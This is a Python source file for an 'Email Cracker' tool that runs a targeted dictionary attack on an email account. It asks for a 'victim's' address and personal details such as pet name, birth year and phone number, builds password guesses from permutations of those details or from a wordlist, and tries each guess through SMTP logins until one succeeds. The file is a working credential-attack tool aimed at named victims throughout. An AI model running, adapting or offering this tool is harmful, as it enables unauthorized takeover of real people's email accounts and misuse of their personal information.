from itertools import permutations,combinations
import os,sys,time,socket,smtplib,argparse,configparser


setup = configparser.ConfigParser()
setup.read('config.ini')
SMTPhost = setup.get('SMTP', 'host')
SMTPport = setup.getint('SMTP', 'port')


stop="\033[0m"
red="\033[91;1m"
blue="\033[94;1m"
green="\033[92;1m"
yellow="\033[93;1m"
purple="\033[95;1m"


add=f"{red}[{stop}+{red}]{yellow} "
error=f"{blue}[{stop}-{blue}]{red} "
notice=f"{blue}[{stop}!{blue}]{red} "
info2=f"{green}[{stop}•{green}]{purple} "
success=f"{purple}[{stop}√{purple}]{green} "
first= f"{green}[{stop}01{green}]{purple} "
second= f"{green}[{stop}02{green}]{purple} "
third= f"{green}[{stop}03{green}]{purple} "
version="2.9.0"


def slow2(y):
    for x in y+'    '+'    '+'\r':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(1./300)

def slow(y):
    for x in y:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(1./300)

def show(y):
    for x in y+'\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(1./1000)

def slowbr(y):
    for x in y+'\n':
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(1./300)

def loadbr(y):
    for x in y:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(1./300)

    for a in '...'+'\n':
        sys.stdout.write(a)
        sys.stdout.flush()
        time.sleep(1)

def load(y):
    for x in y:
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(1./300)

    for a in '...'+'      '+'\r':
        sys.stdout.write(a)
        sys.stdout.flush()

        if a==' ':time.sleep(1./300)
        else:time.sleep(1)


def internet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect_ex(("www.google.com",80))
        return True
    except Exception:return False
    

def aboutus(): 
    os.system("clea" + "r || cls")
    granted()

    slowbr(f'\t{info2}Tool Name      {blue}:>>{purple}  Email Cracker')
    slowbr(f'\t{info2}Version        {blue}:>>{purple}  v[{version[:-2]}]')
    slowbr(f'\t{info2}Author         {blue}:>>{purple}  woode')
    slowbr(f'\t{info2}Github         {blue}:>>{purple}  Woode-Ahmed')
    slowbr(f'\t{info2} Telegram        {blue}:>>{purple}  NO_BRAK')
    slowbr(f'\t{info2}Latest Update  {blue}:>>{purple}  23 - 05 - 2025')
    slowbr(f'\t{info2}Website        {blue}:>>{purple}  https://stirring-beignet-50ee76.netlify.app/{red}')

    slowbr("===========================================================")
    slowbr("")
    act=input(f'{add}Press {purple}[{stop}ENTER{purple}]{yellow} To Continue')
    
    main()
    # return main()

def granted():
    logo=f"""{green}
            ╭╮╭╮╭┳━━━┳━━━┳━━━┳━━━╮
            ┃┃┃┃┃┃╭━╮┃╭━╮┣╮╭╮┃╭━━╯
            ┃┃┃┃┃┃┃╱┃┃┃╱┃┃┃┃┃┃╰━━╮
            ┃╰╯╰╯┃┃╱┃┃┃╱┃┃┃┃┃┃╭━━╯
            ╰╮╭╮╭┫╰━╯┃╰━╯┣╯╰╯┃╰━━╮
            ╱╰╯╰╯╰━━━┻━━━┻━━━┻━━━╯
            
         Tray and tray you can do it 
            """
    slowbr(logo)

    slow(f"{red}")
    slowbr("===========================================================")
    slowbr(f"{blue}:>> {green}Coded by Ahmed {red}Woode {blue}<<:".center(85," "))
    slowbr(f"{blue}:>> {green}https://stirring-beignet-50ee76.netlify.app/ {blue}<<:".center(79," "))
    slowbr(f"{blue}:>> {green}Email Cracker {blue}<<:{red}".center(87," "))
    slowbr("===========================================================")


def banner(password,ban):
    bannerOne=f"""{stop}| {blue}:>> {purple} Email Cracker  {blue}<<: {stop}|{red}""".center(95," ")+"""\n"""+"""="""*60+f"""\n{stop}|  {purple}Gather Information on Victim's Before Using This Tool! {stop} |{red}\n"""+"""="""*60+f"""\n{stop}"""
    bannerTwo=f"""{stop}| {blue}:>> {stop} [{green}{len(password)}{stop}]  {purple}Password Generated!  {blue}<<: {stop}|{red}""".center(110," ")+"""\n"""+"""="""*60+f"""\n{stop}| {purple}Attempting To Crack Given Mail With Generated Passwords! {stop}|{red}\n"""+"""="""*60+f"""\n{stop}"""
    bannerThree=f"""{stop}| {blue}:>> {purple} Zero Password Generated  {blue}<<: {stop}|{red}""".center(95," ")+"""\n"""+"""="""*60+f"""\n{stop}| {purple}U Most Provide Victim's Information To Generate Password {stop}|{red}\n"""+"""="""*60+f"""\n{stop}"""
    
    if ban=="1":return bannerOne
    elif ban=="2":return bannerTwo
    else:return bannerThree
    

def get_info2():
    pet=input(f"{add}Victim's Pet Name: {purple}")
    father=input(f"{add}Victim's Son Name: {purple}")
    name=input(f"{add}Victim's First Name: {purple}")
    nnnm=input(f"{add}Victim's Nick Name: {purple}")
    year=input(f"{add}Victim's Year-of-Birth: {purple}")
    phone=input(f"{add}Victim's Phone Number: {purple}")

    infoga.append(pet),infoga.append(year),infoga.append(name)
    infoga.append(nnnm),infoga.append(father),infoga.append(phone),time.sleep(2)

    while True:
        Do = input(f"{add} Add additional information {stop}[{green}Y{stop}/{green}n{stop}]{stop}:{blue} ")

        if not Do.lower() in ['y', 'yes', 'n', 'no']:
            slowbr(f"{err} Invalid Option!{stop}")
            os.sys.exit(1)
        if not Do.lower() in ['y', 'yes']:
            break

        additional = input(f"{add} Enter Extra Information:{blue} ")
        infoga.append(additional)

def get_info():
    os.system("clear || cls")
    slowbr(banner(password,ban="1"))
    slowbr(f"{first} Used our Wordlist")
    slowbr(f"{second} Generate your Wordlist")
    slowbr(f"{third} Nevigate to exitting Wordlist")
    method=input(f"\n{add}Chooce Which Method to Used: {purple}")

    os.system("clear || cls")
    slowbr(banner(password,ban="1"))
    mail=input(f"{add}Victim's Email Addr: {purple}")
    victim.append(mail)
    time.sleep(2)

    os.system("clear || cls")
    slowbr(banner(password,ban="1"))

    if method in ['01','1']:
        pass
    elif method in ['02','2']:
        get_info2()
    elif method in ['03','3']:
        pass
    else:
        slowbr(f"{error}Invalid Wordlist Method")

    return method

def pwdGen(argument):
    method=get_info()

    if method in ['01','1']:
        try:
            with open('passwords.txt','r') as wordlist:
                pass
        except FileNotFoundError:
            slowbr(f"{error}passwords.txt is missing!")
            os.sys.exit()

        with open('passwords.txt') as wordlist:
            pswds = wordlist.readlines()
            for p in pswds:
                p = p.strip()
                password.append(p)

    elif method in ['02','2']:
        for a in range(0, len(infoga)):
            comb=combinations(infoga, a+1)
            for set in list(comb):
                pwdLen=0
                for b in set:pwdLen+=len(b)
                if argument.minLen<=pwdLen<=argument.maxLen:
                    perm=permutations(set)
                    for c in list(perm):
                        pwd=("")
                        for d in range(0,len(c)):pwd+=c[d]
                        if pwd in password:continue 
                        else:password.append(pwd)

    else:
        wordlist=input(f"{add}Enter Path To Wordlist File: {purple}")
        try:
            with open(wordlist,'r') as wordlist:
                pass
        except FileNotFoundError:
            slowbr(f"{error}{wordlist} Does not Exist!")
            os.sys.exit()

        with open(wordlist,'r') as wordlist:
            pswds = wordlist.readlines()
            for p in pswds:
                p = p.strip()
                password.append(p)
               

def cracker(argument):
    pwdGen(argument)
    os.system("clear || cls")

    if len(password)==0:
        slowbr(banner(password,ban="3"))
        slowbr(f"{error}We Are Unable To Generate Password!,{stop}")
        slowbr(f"{notice}IF you are using your provided wordlist,{stop}")
        slowbr(f"{notice}Please Ensure it contains Atlease 2 Or More words,{stop}")
        slowbr(f"{notice}In Order To Avoid This Error.{stop}")
        os.sys.exit()
        

    slowbr(banner(password,ban="2"))
    slowbr("")

    slow(f"{notice}Pleace Wait!, Starting SMTP Server{stop}"),load('')
    try:
        smtpObj = smtplib.SMTP_SSL(SMTPhost,SMTPport)
        smtpObj.ehlo()
    except TimeoutError:slowbr(f"{error}Connection Faild, Timeout!")
    except ConnectionAbortedError:slowbr(f"{error}Look like You're out of data!")
    # smtpObj.starttls()
    # time.sleep(1)
    index=0

    mail=victim[0]
    for pwd in password:
        index+=1
        slow(f"{notice}{index} of {len(password)}, {yellow}Trying {blue}:>>{yellow} {pwd}{stop}"),load('')

        try:
            smtpObj.login(mail, pwd)
            os.system("clear || cls")
            time.sleep(1)

            slowbr(f'\t{green}Password Found!')
            loadbr(f'\t{green}This Account Has Been Hacked{stop} ^_^')
            time.sleep(3)

            os.system("clear || cls"), granted()
            slowbr(f"\t{success}Victim's Email Addr {blue}:>> {green}{mail}")
            slowbr(f"\t{success}Victim's Password {blue}:>> {green}{pwd}{stop}")
            os.sys.exit(1)

        except smtplib.SMTPAuthenticationError as err:
            if str(err)[14]=='<':
                loadbr(f'\t{green}This Account Has Been Hacked{stop} ^_^'),show()
                time.sleep(3)

                slowbr(f'\t{green}Password Found {blue}:>> {green}{pwd}')
                slowbr(f'\t{green}Email Address {blue}:>> {green}{mail}{stop}')
                os.sys.exit(1)

            else:slow2(f'{red}Password {blue}:>>{red} Not Matched!')
    slow2(f'\n{notice}Password Not Found!{stop}'),slowbr('')


def main():
    parser=argparse.ArgumentParser(
        description = "This is a dictionary attack tool that generates a list of password (wordlist)" + " "
                    + "based on the victim's informatiom provided and trys to crack the victim's email password."
    )

    parser.add_argument(
        "---minLen", default=4,
        help="minimum length of password"
    )

    parser.add_argument(
        "--maxLen", default=18,
        help="maximum length of password"
    )

    argument=parser.parse_args()
    os.system("clear || cls"),granted()

    net=internet()
    # if net:
    if not net:
        time.sleep(1)
        slow(f"\n{error}Please Check Your Internet Connection{stop}")
        os.sys.exit()

    try:
        slowbr(f"""\n\t{first}Launch Attacks\n\t{second}About\n\t{third}Exit\n""")
        opt=input(f"""{green}[{stop}SELECT OPTION..{green}] {blue}:>>{purple} """)

        if opt in["1","01","a","A"]:cracker(argument)
        elif opt in["2","02","b","B"]:aboutus()
        elif opt in["3","03","c","C"]:slowbr(f"\n{error}Thanks for using our tool.{stop}"),os.sys.exit()
        else:loadbr(f"\n{error}Invali Option!{stop}"%(error,stop)),main()

    except KeyboardInterrupt:slowbr(f"\n\n{error}User Requested an Interrupt!{stop}"),slow(f"{error}Program Running Down!{stop}"),loadbr(''),os.sys.exit()


victim=[]
infoga=[]
password=[]
if __name__ == "__main__":
    main()

